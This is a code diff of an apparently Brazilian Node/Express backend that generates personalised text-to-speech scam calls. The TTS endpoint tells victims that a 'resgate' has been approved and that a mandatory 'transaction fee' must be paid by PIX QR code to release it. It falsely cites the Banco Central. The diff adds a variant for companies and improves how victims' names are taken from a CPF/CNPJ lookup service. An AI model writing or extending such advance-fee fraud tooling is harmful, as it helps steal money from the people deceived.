@@ -543,15 +543,20 @@ app.get("/api/config", (req, res) => {
 
 // --- NOVO: TTS E BUYPIX ---
 app.post("/api/v1/tts", async (req, res) => {
-  const { name, attendantName, voiceId, value } = req.body;
+  const { name, attendantName, voiceId, value, docType } = req.body;
   if (!name) return res.status(400).json({ error: "Nome não fornecido" });
 
   const firstName = name.split(" ")[0] || "Cidadão";
   const atendente = attendantName || "Assistente";
-  const idVoz = voiceId || "GM2UA3fbsIaLHcswCDX9";
+  const idVoz = voiceId || "EXAVITQu4vr4xnSDxMaL";
   const valorTexto = value ? `no valor de ${value}` : "";
 
-  const script = `Olá, ${firstName}. É um grande prazer falar com você. Meu nome é ${atendente} e informo que o seu processo de resgate ${valorTexto} foi aprovado com sucesso. Para que possamos liberar a transferência PIX diretamente para a sua conta vinculada ao Banco Central, é necessário realizar o pagamento da tarifa transacional obrigatória. Este é um procedimento de segurança padrão exigido pelo sistema. Assim que o pagamento for compensado, o valor integral será creditado em sua conta em até dois minutos. Por favor, copie o código abaixo ou escaneie o QR Code para finalizar a liberação.`;
+  let script = "";
+  if (docType && docType.toUpperCase() === 'CNPJ') {
+    script = `Olá. É um grande prazer falar com você. Meu nome é ${atendente} e informo que o processo de resgate da sua empresa, ${valorTexto}, foi aprovado com sucesso. Para que possamos liberar a transferência PIX diretamente para a conta vinculada ao Banco Central, é necessário realizar o pagamento da tarifa transacional empresarial obrigatória. Este é um procedimento de segurança padrão exigido pelo sistema. Assim que o pagamento for compensado, o valor integral será creditado na conta em até dois minutos. Por favor, copie o código abaixo ou escaneie o QR Code para finalizar a liberação.`;
+  } else {
+    script = `Olá, ${firstName}. É um grande prazer falar com você. Meu nome é ${atendente} e informo que o seu processo de resgate ${valorTexto} foi aprovado com sucesso. Para que possamos liberar a transferência PIX diretamente para a sua conta vinculada ao Banco Central, é necessário realizar o pagamento da tarifa transacional obrigatória. Este é um procedimento de segurança padrão exigido pelo sistema. Assim que o pagamento for compensado, o valor integral será creditado em sua conta em até dois minutos. Por favor, copie o código abaixo ou escaneie o QR Code para finalizar a liberação.`;
+  }
 
   try {
     const apiKey = process.env.ELEVENLABS_API_KEY || "";
@@ -726,12 +731,16 @@ app.post("/api/v1/validate/document", async (req, res) => {
     console.log("Infoseek response:", JSON.stringify(responseData));
 
     // A API pode retornar o nome em diferentes campos dependendo se é CPF ou CNPJ
-    const name = responseData.data?.dadosCPF?.NOME ||
-      responseData.data?.dadosCNPJ?.RAZAO_SOCIAL ||
-      responseData.data?.name ||
-      responseData.data?.nome ||
-      responseData.data?.Nome ||
-      responseData.data?.razao_social ||
+    const dt = responseData.data || responseData;
+    const name = dt?.dadosCPF?.NOME ||
+      dt?.rzo?.razao_social ||
+      dt?.dadosCNPJ?.RAZAO_SOCIAL ||
+      dt?.nome ||
+      dt?.name ||
+      dt?.NOME ||
+      dt?.RAZAO_SOCIAL ||
+      dt?.dados?.nome ||
+      dt?.dados?.razao_social ||
       responseData.name ||
       "Cidadão";
 
